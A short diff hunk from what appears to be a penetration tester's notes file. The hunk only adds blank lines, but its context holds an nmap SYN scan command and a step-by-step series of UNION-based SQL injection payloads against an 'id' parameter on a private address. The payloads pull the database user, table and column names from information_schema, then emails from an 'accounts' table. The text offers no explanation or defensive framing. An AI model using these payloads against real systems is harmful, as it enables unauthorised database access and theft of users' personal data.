@@ -39,11 +39,17 @@ nmap -sS -P0  -A -oA 192.168.100.1 -T4 192.168.100.1
 	
 	192.168.10.1?id=100' and 1=2 UNION SELECT 1,2,user()  --%20
 
+
+
 	
 	192.168.10.1?id=100' and 1=2 UNION SELECT 1,2, ( SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 0,1 )--%20
 
 
+
+
 	192.168.10.1?id=100' and 1=2 UNION SELECT 1,2, ( SELECT column_name FROM information_schema.columns WHERE table_name='accounts' limit 0,1 )--%20
+
+
 
 
 	192.168.10.1?id=100' and 1=2 UNION SELECT 1,2, ( SELECT email FROM   accounts limit 0,1 )--%20
